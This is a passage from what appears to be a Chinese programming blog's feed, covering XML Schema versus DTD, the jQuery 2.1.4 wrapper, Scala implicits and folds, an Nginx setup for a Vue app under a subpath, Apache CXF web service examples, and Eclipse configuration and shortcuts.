<li>创建由标准类型衍生而来的您自己的数据类型</li>
<li>在相同的文档中引用多重的 Schema</li>
</ul>
<h4 id="形式良好是不够的"><a href="#形式良好是不够的" class="headerlink" title="形式良好是不够的"></a>形式良好是不够的</h4><p>我们把符合 XML 语法的文档称为形式良好的 XML 文档，比如：</p>
<ul>
<li>它必须以 XML 声明开头</li>
<li>它必须拥有唯一的根元素</li>
<li>开始标签必须与结束标签相匹配</li>
<li>元素对大小写敏感</li>
<li>所有的元素都必须关闭</li>
<li>所有的元素都必须正确地嵌套</li>
<li>必须对特殊字符使用实体</li>
</ul>
<p>即使文档的形式良好，仍然不能保证它们不会包含错误，并且这些错误可能会产生严重的后果。</p>
<p>请考虑下面的情况：您订购的了 5 打激光打印机，而不是 5 台。通过 XML Schema，大部分这样的错误会被您的验证软件捕获到。</p>
<h3 id="如何使用-XSD？"><a href="#如何使用-XSD？" class="headerlink" title="如何使用 XSD？"></a>如何使用 XSD？</h3><p>XML 文档可对 DTD 或 XML Schema 进行引用。</p>
<h4 id="一个简单的-XML-文档："><a href="#一个简单的-XML-文档：" class="headerlink" title="一个简单的 XML 文档："></a>一个简单的 XML 文档：</h4><p>请看这个名为 “note.xml” 的 XML 文档：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;note&gt;
    &lt;to&gt;George&lt;/to&gt;
    &lt;from&gt;John&lt;/from&gt;
    &lt;heading&gt;Reminder&lt;/heading&gt;
    &lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
</code></pre>
<h4 id="DTD-文件"><a href="#DTD-文件" class="headerlink" title="DTD 文件"></a>DTD 文件</h4><p>下面这个例子是名为 “note.dtd” 的 DTD 文件，它对上面那个 XML文档的元素进行了定义：</p>
<pre><code>&lt;!ELEMENT note (to, from, heading, body)&gt;
&lt;!ELEMENT to (#PCDATA)&gt;
&lt;!ELEMENT from (#PCDATA)&gt;
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body (#PCDATA)&gt;
</code></pre>
<p>第 1 行定义 note 元素有四个子元素：”to, from, heading, body”。</p>
<p>第 2-5 行定义了 to, from, heading, body 元素的类型是 “#PCDATA”。</p>
<h4 id="XML-Schema"><a href="#XML-Schema" class="headerlink" title="XML Schema"></a>XML Schema</h4><p>下面这个例子是一个名为 “note.xsd” 的 XML Schema 文件，它定义了上面那个XML文档的元素：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;
targetNamespace=&quot;http://www.w3school.com.cn&quot;
xmlns=&quot;http://www.w3school.com.cn&quot;
elementFormDefault=&quot;qualified&quot;&gt;

&lt;xs:element name=&quot;note&quot;&gt;
    &lt;xs:complexType&gt;
      &lt;xs:sequence&gt;
    &lt;xs:element name=&quot;to&quot; type=&quot;xs:string&quot;/&gt;
    &lt;xs:element name=&quot;from&quot; type=&quot;xs:string&quot;/&gt;
    &lt;xs:element name=&quot;heading&quot; type=&quot;xs:string&quot;/&gt;
    &lt;xs:element name=&quot;body&quot; type=&quot;xs:string&quot;/&gt;
      &lt;/xs:sequence&gt;
    &lt;/xs:complexType&gt;
&lt;/xs:element&gt;
&lt;/xs:schema&gt;
</code></pre>
<p>note 元素是一个复合类型，因为它包含其他的子元素。其他元素 (to, from,heading, body)是简易类型，因为它们没有包含其他元素。您将在下面的章节学习更多有关复合类型和简易类型的知识。</p>
<h4 id="对-DTD-的引用"><a href="#对-DTD-的引用" class="headerlink" title="对 DTD 的引用"></a>对 DTD 的引用</h4><p>此文件包含对 DTD 的引用：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note SYSTEM &quot;http://www.w3school.com.cn/dtd/note.dtd&quot;&gt;
&lt;note&gt;
    &lt;to&gt;George&lt;/to&gt;
    &lt;from&gt;John&lt;/from&gt;
    &lt;heading&gt;Reminder&lt;/heading&gt;
    &lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
</code></pre>
<h4 id="对-XML-Schema-的引用"><a href="#对-XML-Schema-的引用" class="headerlink" title="对 XML Schema 的引用"></a>对 XML Schema 的引用</h4><p>此文件包含对 XML Schema 的引用：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;note
xmlns=&quot;http://www.w3school.com.cn&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xsi:schemaLocation=&quot;http://www.w3school.com.cn note.xsd&quot;&gt;
    &lt;to&gt;George&lt;/to&gt;
    &lt;from&gt;John&lt;/from&gt;
    &lt;heading&gt;Reminder&lt;/heading&gt;
    &lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>jquery源码分析（一）</title>
    <url>/blog/webtech/jquery/jsource1/</url>
    <content><![CDATA[<p>本系列文章以jquery-2.1.4.js为标准，可以从官网下载非压缩的开发版进行查看。</p>
<p>下面先看一jquery的概貌。</p>
<h2 id="jquery的概貌"><a href="#jquery的概貌" class="headerlink" title="jquery的概貌"></a>jquery的概貌</h2><pre><code>/*!
 * jQuery JavaScript Library v2.1.4
 * http://jquery.com/
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 *
 * Copyright 2005, 2014 jQuery Foundation, Inc. and other contributors
 * Released under the MIT license
 * http://jquery.org/license
 *
 * Date: 2015-04-28T16:01Z
 */
(function( global, factory ) &#123;
    if ( typeof module === &quot;object&quot; &amp;&amp; typeof module.exports === &quot;object&quot; ) &#123;
        // For CommonJS and CommonJS-like environments where a proper `window`
        // is present, execute the factory and get jQuery.
        // For environments that do not have a `window` with a `document`
        // (such as Node.js), expose a factory as module.exports.
        // This accentuates the need for the creation of a real `window`.
        // e.g. var jQuery = require(&quot;jquery&quot;)(window);
        // See ticket #14549 for more info.
        module.exports = global.document ?
            factory( global, true ) :
            function( w ) &#123;
                if ( !w.document ) &#123;
                    throw new Error( &quot;jQuery requires a window with a document&quot; );
                &#125;
                return factory( w );
            &#125;;
    &#125; else &#123;
        factory( global );
    &#125;

// Pass this if window is not defined yet
&#125;(typeof window !== &quot;undefined&quot; ? window : this, function( window, noGlobal ) &#123;......&#125;)
);
</code></pre>
<p>从文件注释中可以看到，jquery.js里包含了另一个js，Sizzle.js。</p>
<p><strong>Sizzle引擎</strong></p>
<p>Sizzle是jQuery的御用选择器引擎，是jQuery作者John<br>Resig写的DOM选择器引擎，速度号称业界第一。另外，Sizzle是独立的一部分，不依赖任何库，如果你不想用jQuery,可<br>以只用Sizzle。所以单独拿出来特别对待。</p>
<p>第一个匿名函数<code>function( global, factory ):</code></p>
<p>这个函数是处理<a href="/webtech/javascript/commonjsjj.php">CommonJS</a>环境下创建jquery问题的。jquery不只是在浏览器环境下可以用，我们不用太关心。</p>
<p>这个匿名函数创建后马上传入了参数执行:</p>
<pre><code>(typeof window !== &quot;undefined&quot; ? window : this, function( window, noGlobal ) &#123;......&#125;)
</code></pre>
<p>其中第二个参数是一个匿名函数，这个才是创建jquery的真正函数，浏览器中global实际为window对象，window对象没有exports属性，所以最后会执行<code>factory( global );</code>。</p>
<p>所以创建jquery的匿名函数在浏览器中传入了window对象。</p>
<p>后面讨论的内容都是</p>
<pre><code>function( window, noGlobal ) &#123;
    ......
&#125;
</code></pre>
<p>这个匿名函数里的内容。</p>
]]></content>
      <categories>
        <category>WEB开发</category>
      </categories>
      <tags>
        <tag>WEB开发</tag>
        <tag>jquery</tag>
      </tags>
  </entry>
  <entry>
    <title>【scala】关键字implicit详解</title>
    <url>/blog/plang/scala/implicit/</url>
    <content><![CDATA[<p>掌握<code>implicit</code>的用法是阅读Spark源码的基础，也是学习Scala其它的开源框架的关键，<code>implicit</code> 可分为：</p>
<p>隐式参数<br>隐式转换类型<br>隐式调用函数</p>
<h2 id="隐式参数"><a href="#隐式参数" class="headerlink" title="隐式参数"></a>隐式参数</h2><p>当我们在定义方法时，可以把最后一个参数列表标记为<code>implicit</code>，表示该组参数是隐式参数。一个方法只会有一个隐式参数列表，置于方法的最后一个参数列表。如果方法有多个隐式参数，只需一个<code>implicit</code>修饰即可。</p>
<p>当调用包含隐式参数的方法是，如果当前上下文中有合适的隐式值，则编译器会自动为改组参数填充合适的值。如果没有编译器会抛出异常。当然，标记为隐式参数的我们也可以手动为该参数添加默认值。</p>
<p><code>def foo(n: Int)(implicit t1: String, t2: Double = 3.14)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala &gt; def calcTax(amount: Float)(implicit rate: Float): Float = amount * rate</span><br><span class="line">scala &gt; implicit val currentTaxRate = 0.08F</span><br><span class="line">scala &gt; val tax = calcTax(50000F) // 4000.0</span><br></pre></td></tr></table></figure>

<p>如果编译器在上下文没有找到第二行代码会报错</p>
<h3 id="隐式地转换类型"><a href="#隐式地转换类型" class="headerlink" title="隐式地转换类型"></a>隐式地转换类型</h3><p>使用隐含转换将变量转换成预期的类型是编译器最先使用<code>implicit</code>的地方。这个规则非常简单，当编译器看到类型X而却需要类型Y，它就在当前作用域查找是否定义了从类型X到类型Y的隐式定义<br>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val i: Int = 3.5 //直接报错</span><br><span class="line">加上这句：</span><br><span class="line">scala&gt; implicit def double2Int(d: Double) = d.toInt</span><br><span class="line">再运行，没报错</span><br><span class="line">scala&gt; val i: Int = 3.5  //i=3</span><br></pre></td></tr></table></figure>

<h3 id="隐式调用函数"><a href="#隐式调用函数" class="headerlink" title="隐式调用函数"></a>隐式调用函数</h3><p>隐式调用函数可以转换调用方法的对象，比如但编译器看到<code>X.method</code>，而类型 X 没有定义 method（包括基类)方法，那么编译器就查找作用域内定义的从 X 到其它对象的类型转换，比如 Y，而类型Y定义了 method 方法，编译器就首先使用隐含类型转换把 X 转换成 Y，然后调用 Y 的 method。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class SwingType&#123;</span><br><span class="line">  def  wantLearned(sw : String) = println(&quot;兔子已经学会了&quot;+sw)</span><br><span class="line">&#125;</span><br><span class="line">object swimming&#123;</span><br><span class="line">  implicit def learningType(s : AminalType) = new SwingType</span><br><span class="line">&#125;</span><br><span class="line">class AminalType</span><br><span class="line">object AminalType extends  App&#123;</span><br><span class="line">  import com.mobin.scala.Scalaimplicit.swimming._</span><br><span class="line">  val rabbit = new AminalType</span><br><span class="line">    rabbit.wantLearned(&quot;breaststroke&quot;)         //蛙泳</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上例中编译器在rabbit对象调用时发现对象上并没有wantLearning方法，此时编译器就会在作用域范围内查找能使其编译通过的隐式视图，找到learningType方法后，编译器通过隐式转换将对象转换成具有这个方法的对象，之后调用wantLearning方法</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Scala</category>
      </categories>
      <tags>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title>【scala】fold算子示例：字每记数</title>
    <url>/blog/plang/scala/fold/</url>
    <content><![CDATA[<p>对一个字符串中的字母统计数量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val rs=&quot;abadcds&quot;.foldLeft(Map[Char, Int]())((m, c) =&gt; m + (c -&gt; (m.getOrElse(c, 0)+1) ))</span><br><span class="line">print(rs)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map(s -&gt; 1, a -&gt; 2, b -&gt; 1, c -&gt; 1, d -&gt; 2)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Scala</category>
      </categories>
      <tags>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title>【scala】用正则提取变量</title>
    <url>/blog/plang/scala/regexset/</url>
    <content><![CDATA[<p>很有意思的变量赋值方式，把正则匹配的组赋给变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val p=&quot;(.*)=&#x27;(.*)&#x27;&quot;.r</span><br><span class="line">val p(a,b)=(&quot;abc=&#x27;ddd&#x27;&quot;)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Scala</category>
      </categories>
      <tags>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title>VUE用Nginx的非根配制</title>
    <url>/blog/webtech/vue/vuenginx/</url>
    <content><![CDATA[<p>项目需求，将一个springboot项目新界面做成前后分离的。</p>
<p>前端是用VUE开发的，所以要用Nginx配制一下。</p>
<p>原来的服务路径不能变，所以要映射到根。</p>
<p>新的界面映射到view相对路径，也就是VUE开发的界面。</p>
<p>对外还是一个地址，所以要映射到一个server上。</p>
<p>VUE是单页应用，所以所有请求都要转到index上。</p>
<p>遇到的第一个问题是<code>location</code>的配制，这里要用<code>try_files</code>都映射到<code>index.html</code></p>
<p>第二个问题是css和js都映射到了<code>index.html</code>,内容都变成了html文本，这里要把js和css重新做一下映射。</p>
<p>这里主要做了三个配制，vue的dist目录映射、vue的js和css映射、原服务的代理映射</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen       8090;</span><br><span class="line"></span><br><span class="line">       location ^~ /view/ &#123;</span><br><span class="line">           root   D:/mgrdist/dist/;</span><br><span class="line">           try_files $uri $uri/ /index.html last;</span><br><span class="line">           index index.html;</span><br><span class="line">       &#125;</span><br><span class="line">	location ^~ /view/static/ &#123;</span><br><span class="line">           alias  D:/mgrdist/dist/static/;</span><br><span class="line">       &#125;</span><br><span class="line">	</span><br><span class="line">	location / &#123;</span><br><span class="line">           proxy_pass   http://127.0.0.1:8084;</span><br><span class="line">           </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="location、root、alias指令用法和区别"><a href="#location、root、alias指令用法和区别" class="headerlink" title="location、root、alias指令用法和区别"></a>location、root、alias指令用法和区别</h2><p>nginx指定文件路径有两种方式root和alias，指令的使用方法和作用域：</p>
<p>[root]</p>
<p>语法：root path</p>
<p>默认值：root html</p>
<p>配置段：http、server、location、if</p>
<p>[alias]</p>
<p>语法：alias path</p>
<p>配置段：location</p>
<p>root与alias主要区别在于nginx如何解释location后面的uri，这会使两者分别以不同的方式将请求映射到服务器文件上。</p>
<p>root的处理结果是：root路径＋location路径</p>
<p>alias的处理结果是：使用alias路径替换location路径</p>
<p>alias是一个目录别名的定义，root则是最上层目录的定义。</p>
<p>还有一个重要的区别是alias后面必须要用“&#x2F;”结束，否则会找不到文件的，而root则可有可无</p>
<p>root实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ^~ /t/ &#123;</span><br><span class="line">     root /www/root/html/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果一个请求的URI是&#x2F;t&#x2F;a.html时，web服务器将会返回服务器上的&#x2F;www&#x2F;root&#x2F;html&#x2F;t&#x2F;a.html的文件。</p>
<p>alias实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ^~ /t/ &#123;</span><br><span class="line"> alias /www/root/html/new_t/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果一个请求的URI是&#x2F;t&#x2F;a.html时，web服务器将会返回服务器上的&#x2F;www&#x2F;root&#x2F;html&#x2F;new_t&#x2F;a.html的文件。</p>
<p>注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。</p>
<p>注意：</p>
<ol>
<li>使用alias时，目录名后面一定要加”&#x2F;“。</li>
<li>alias在使用正则匹配时，必须捕捉要匹配的内容并在指定的内容处使用。</li>
<li>alias只能位于location块中。（root可以不放在location中）</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>用CXF搭建webservice示例</title>
    <url>/blog/webtech/ws/cxfdemo/</url>
    <content><![CDATA[<p>Apache CXF 是一个开放源代码框架，提供了用于方便地构建和开发 Web<br>服务的可靠基础架构。它允许创建高性能和可扩展的服务，您可以将这样的服务部署在<br>Tomcat 和基于 Spring 的轻量级容器中，以及部署在更高级的服务器上。</p>
<p>下面是一个不依赖于WEB容器，可以独立运行的webservice示例：</p>
<pre><code>package com.iteedu.webservice.demo;

public class User &#123;

    private String name;
    public String getName()&#123;
        return name;
    &#125;
    public void setName(String name) &#123;
        this.name = name;
    &#125;
    
&#125;


package com.iteedu.webservice.demo;

import java.util.List;

import javax.jws.WebParam;
import javax.jws.WebService;

@WebService
public interface HelloWorld &#123;
    String sayHi(@WebParam(name = &quot;text&quot;) String text);

    String sayHiToUser(User user);

    String[] SayHiToUserList(List&lt; User&gt; userList);
&#125;

package com.iteedu.webservice.demo;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import javax.jws.WebService;

@WebService(endpointInterface = &quot;com.iteedu.webservice.demo.HelloWorld&quot;, serviceName = &quot;HelloWorld&quot;)
public class HelloWorldImpl implements HelloWorld &#123;

    Map&lt; Integer, User&gt; users = new LinkedHashMap&lt; Integer, User&gt;();

    public String sayHi(String text) &#123;
        return &quot;Hello &quot; + text;
    &#125;

    public String sayHiToUser(User user) &#123;
        users.put(users.size() + 1, user);
        return &quot;Hello &quot; + user.getName();
    &#125;

    public String[] SayHiToUserList(List&lt; User&gt; userList) &#123;
        String[] result = new String[userList.size()];
        int i = 0;
        for (User u : userList) &#123;
            result[i] = &quot;Hello &quot; + u.getName();
            i++;
        &#125;
        return result;
    &#125;
&#125;

package com.iteedu.webservice.demo;

import javax.xml.ws.Endpoint;

public class WebServiceApp &#123;
    public static void main(String[] args) &#123;
        System.out.println(&quot;web service start&quot;);
        HelloWorldImpl implementor = new HelloWorldImpl();
        String address = &quot;http://localhost:8080/helloWorld&quot;;
        Endpoint.publish(address, implementor);
        System.out.println(&quot;web service started&quot;);
    &#125;
&#125;
</code></pre>
<p>通过运行WebServiceApp可以启动webservice服务。</p>
<p>访问 <a href="http://localhost:8080/helloWorld?wsdl">http://localhost:8080/helloWorld?wsdl</a> 查看是否显示wsdl。</p>
<p>再写一个客户端访问一下：</p>
<pre><code>package com.iteedu.webservice.demo;

import java.util.Arrays;

import org.apache.cxf.jaxws.JaxWsProxyFactoryBean;

public class HelloWorldClient &#123;
    public static void main(String[] args) &#123;
        JaxWsProxyFactoryBean svr = new JaxWsProxyFactoryBean();
        svr.setServiceClass(HelloWorld.class);
        svr.setAddress(&quot;http://localhost:8080/helloWorld&quot;);
        HelloWorld hw = (HelloWorld) svr.create();
        System.out.println(hw.sayHi(&quot;abc&quot;));
        User user = new User();
        user.setName(&quot;Tony&quot;);
        System.out.println(hw.sayHiToUser(user));
        String[] rs2=hw.SayHiToUserList(Arrays.asList(new User[]&#123;user,user&#125;));
        System.out.println(Arrays.toString(rs2));
    &#125;
&#125;
</code></pre>
<p>运行结果：</p>
<pre><code>Hello abc
Hello Tony
[Hello Tony, Hello Tony]
</code></pre>
<p>其中接口类和参数类可以打成jar包分发到客户端。</p>
]]></content>
      <categories>
        <category>WEB开发</category>
      </categories>
      <tags>
        <tag>webservice</tag>
        <tag>WEB开发</tag>
      </tags>
  </entry>
  <entry>
    <title>在web项目中用CXF搭建webservice服务</title>
    <url>/blog/webtech/ws/cxfwebdemo/</url>
    <content><![CDATA[<p>Apache CXF 是一个开放源代码框架，提供了用于方便地构建和开发 Web<br>服务的可靠基础架构。它允许创建高性能和可扩展的服务，您可以将这样的服务部署在<br>Tomcat 和基于 Spring 的轻量级容器中，以及部署在更高级的服务器上。</p>
<p>下面是一个基于WEB集成spring和cxf的webservice示例,WEB的名称为wsweb：</p>
<pre><code>package com.iteedu.webservice.demo;

public class User &#123;

    private String name;
    public String getName()&#123;
        return name;
    &#125;
    public void setName(String name) &#123;
        this.name = name;
    &#125;
    
&#125;


package com.iteedu.webservice.demo;

import java.util.List;

import javax.jws.WebParam;
import javax.jws.WebService;

@WebService
public interface HelloWorld &#123;
    String sayHi(@WebParam(name = &quot;text&quot;) String text);

    String sayHiToUser(User user);

    String[] SayHiToUserList(List&lt; User&gt; userList);
&#125;

package com.iteedu.webservice.demo;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class HelloWorldImpl implements HelloWorld &#123;

    Map&lt; Integer, User&gt; users = new LinkedHashMap&lt; Integer, User&gt;();

    public String sayHi(String text) &#123;
        return &quot;Hello &quot; + text;
    &#125;

    public String sayHiToUser(User user) &#123;
        users.put(users.size() + 1, user);
        return &quot;Hello &quot; + user.getName();
    &#125;

    public String[] SayHiToUserList(List&lt; User&gt; userList) &#123;
        String[] result = new String[userList.size()];
        int i = 0;
        for (User u : userList) &#123;
            result[i] = &quot;Hello &quot; + u.getName();
            i++;
        &#125;
        return result;
    &#125;
&#125;
</code></pre>
<p>相关配制文件：</p>
<p>web.xml</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app version=&quot;3.0&quot; 
    xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; 
    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; 
    xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee 
    http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;&gt;
  &lt;display-name&gt;&lt;/display-name&gt; 
  &lt;welcome-file-list&gt;
    &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;
  &lt;/welcome-file-list&gt;
  &lt;context-param&gt;
           &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
           &lt;param-value&gt;WEB-INF/classes/applicationContext.xml&lt;/param-value&gt;
  &lt;/context-param&gt;

   &lt;listener&gt;
           &lt;listener-class&gt;
                   org.springframework.web.context.ContextLoaderListener
           &lt;/listener-class&gt;
   &lt;/listener&gt;

 

     &lt;servlet&gt;
            &lt;servlet-name&gt;CXFServlet&lt;/servlet-name&gt;
            &lt;display-name&gt;CXFServlet&lt;/display-name&gt;
            &lt;servlet-class&gt;
                   org.apache.cxf.transport.servlet.CXFServlet
            &lt;/servlet-class&gt;
            &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
      &lt;/servlet&gt;

      &lt;servlet-mapping&gt;
             &lt;servlet-name&gt;CXFServlet&lt;/servlet-name&gt;
             &lt;url-pattern&gt;/webservice/*&lt;/url-pattern&gt;
      &lt;/servlet-mapping&gt;
&lt;/web-app&gt;
</code></pre>
<p>applicationContext.xml</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xmlns:jaxws=&quot;http://cxf.apache.org/jaxws&quot;
    xsi:schemaLocation=&quot;
      http://www.springframework.org/schema/beans
      http://www.springframework.org/schema/beans/spring-beans.xsd
      http://cxf.apache.org/jaxws http://cxf.apache.org/schemas/jaxws.xsd&quot;&gt;

    &lt;import resource=&quot;classpath:META-INF/cxf/cxf.xml&quot; /&gt;
    &lt;import resource=&quot;classpath:META-INF/cxf/cxf-extension-soap.xml&quot; /&gt;
    &lt;import resource=&quot;classpath:META-INF/cxf/cxf-servlet.xml&quot; /&gt;

    &lt;jaxws:endpoint id=&quot;helloWorld&quot;
        implementor=&quot;com.iteedu.webservice.demo.HelloWorldImpl&quot;
        address=&quot;/helloWorld&quot; /&gt;
&lt;/beans&gt;
</code></pre>
<p>启动web服务。</p>
<p>访问 <a href="http://localhost:8080/wsweb/webservice/helloWorld?wsdl">http://localhost:8080/wsweb/webservice/helloWorld?wsdl</a><br>查看是否显示wsdl。</p>
<p>再写一个客户端访问一下：</p>
<pre><code>package com.iteedu.webservice.demo;

import java.util.Arrays;

import org.apache.cxf.jaxws.JaxWsProxyFactoryBean;

public class HelloWorldClient &#123;
    public static void main(String[] args) &#123;
        JaxWsProxyFactoryBean svr = new JaxWsProxyFactoryBean();
        svr.setServiceClass(HelloWorld.class);
        svr.setAddress(&quot;http://localhost:8080/wsweb/webservice/helloWorld&quot;);
        HelloWorld hw = (HelloWorld) svr.create();
        System.out.println(hw.sayHi(&quot;abc&quot;));
        User user = new User();
        user.setName(&quot;Tony&quot;);
        System.out.println(hw.sayHiToUser(user));
        String[] rs2=hw.SayHiToUserList(Arrays.asList(new User[]&#123;user,user&#125;));
        System.out.println(Arrays.toString(rs2));
    &#125;
&#125;
</code></pre>
<p>运行结果：</p>
<pre><code>Hello abc
Hello Tony
[Hello Tony, Hello Tony]
</code></pre>
<p>其中接口类和参数类可以打成jar包分发到客户端。</p>
]]></content>
      <categories>
        <category>WEB开发</category>
      </categories>
      <tags>
        <tag>webservice</tag>
        <tag>WEB开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Eclipse里配置内存大小</title>
    <url>/blog/tools/eclipse/jvmconfig/</url>
    <content><![CDATA[<p>配制内存参数的位置：</p>
<ol>
<li>一般安装完eclipse之后，在安装目录下你应该可以看到有一个 eclipse.ini<br>文件，在这里可以配制eclipse启动时的参数，包括内存占用大小。</li>
<li>可以在Eclipse快捷上点右键，选属性，在目标中文字后加入一串参数，如：-vmargs<br>-Xms128M -Xmx256M -XX:PermSize&#x3D;64M -XX:MaxPermSize&#x3D;512M</li>
<li>打开eclipse之后，Preference\Java\JREs中选中要设置的JAVA虚拟机，编辑”默认虚拟机参数”一项。</li>
<li>一般设置内存都是为服务器、中间件设置，如Tomcat。可以在Preference\…\Servers\Tomcat\JDK中设置启动Tomcat的JAVA虚拟机的参数。</li>
</ol>
<p>注意以上设置的作用范围，有的对eclipse有效，有的对java<br>vm有效，有的对服务器有效，要弄清自己要配制哪一部分。</p>
<p>主要配制-vmargs，这个参数是启动java虚拟机时的参数。后面是JAVA VM<br>关于内存的参数选项：</p>
<p>-Xms64M ：虚拟机占用系统的最小内存</p>
<p>-Xmx128M：虚拟机占用系统的最大内存</p>
<p>-XX:PermSize：最小堆大小。一般报内存不足时,都是说这个太小,堆空间剩余小于5%就会警告,建议把这个稍微设大一点,视自己机器内存大小来设置</p>
<p>-XX:MaxPermSize：最大堆大小。这个也适当大些<br>-Xmx512M的5%为25.6M，理论上要求-Xmx的数值与-XX:MaxPermSize必须大于25.6M</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>Eclipse（MyEclipse）必需记住的快捷键</title>
    <url>/blog/tools/eclipse/shortcutkey/</url>
    <content><![CDATA[<h1 id="编码辅助"><a href="#编码辅助" class="headerlink" title="编码辅助"></a>编码辅助</h1><p>快速修复（ctrl+1）</p>
<p>移动行（alt +上&#x2F;下）</p>
<p>复制行（ctrl +alt+上&#x2F;下）</p>
<p>删除行（ctrl +d）</p>
<p>上下文提示（alt +&#x2F;、ctrl +space）</p>
<p>代码生成（alt +shift+s）</p>
<p>格式化代码（ctrl + shift +f）</p>
<p>对齐代码（ctrl +i）</p>
<p>回到上次修改的地方（ctrl +q）</p>
<p>注释&#x2F;取消注释（ctrl +&#x2F;）</p>
<p>注释&#x2F;取消块注释（ctrl + shift +&#x2F;、ctrl + shift +\）</p>
<p>管理导入（ctrl + shift +o）</p>
<p> </p>
<h1 id="查找相关"><a href="#查找相关" class="headerlink" title="查找相关"></a>查找相关</h1><p>快速大纲（ctrl +o）</p>
<p>查找文本（ctrl +f）</p>
<p>打开资源（ctrl + shift +r）</p>
<p>打开类型（ctrl + shift +t）</p>
<p>搜索引用（ctrl + shift +g）</p>
<p> </p>
<h1 id="调试相关"><a href="#调试相关" class="headerlink" title="调试相关"></a>调试相关</h1><p>单步执行（F6）</p>
<p>单步进入（F5）</p>
<p>执行当前栈针（F7）</p>
<p>继续执行（F8）</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>Eclipse常用参数详解</title>
    <url>/blog/tools/eclipse/startparams/</url>
    <content><![CDATA[<p>其实，Eclipse是一个可以进行非常灵活配置的系统，除了以缺省的方式启动以外，还可以指定各种参数来定制启动方式。</p>
<p>-arch [processor architecture]</p>
<p>描述：指定所使用的处理器的类别</p>
<p>举例：eclipse -arch x86或eclipse -arch sparc</p>
<p> </p>
<p>-application [id]</p>
<p>描述：指定要运行的应用，id为扩展org.eclipse.core.applications扩展点的插件id加扩展id</p>
<p>举例：例如有个插件id为edu.sdu.app，扩展id为myapp，则eclipse<br>-application  edu.sdu.app.myapp，就会执行你的扩展应用</p>
<p> </p>
<p>-clean</p>
<p>描述：清空插件缓存内容</p>
<p>举例：eclipse<br>-clean，有时插件显示不出来是因为Eclipse将插件进行了缓存以加速启动过程，若指定此参数则会清空缓存，从头加载</p>
<p> </p>
<p>-configuration [cofigfile location]</p>
<p>描述：指定配置文件的位置，在启动时使用此目录下的配置文件config.ini来启动</p>
<p>举例：eclipse -configuration d:&#x2F;eclipse&#x2F;configuration</p>
<p> </p>
<p>-data [workspace location]</p>
<p>描述：指定启动时的Workspace位置</p>
<p>举例：例如Workspace位置设在D:&#x2F;myworkspace，则eclipse -data<br>D:&#x2F;myworkspace</p>
<p> </p>
<p>-debug [option file]</p>
<p>描述：以Debug状态启动Eclipse，所有的Debug开关在.options文件中指定</p>
<p>举例：eclipse -debug d:&#x2F;eclipse&#x2F;.options</p>
<p> </p>
<p>-dev [classpath entry]</p>
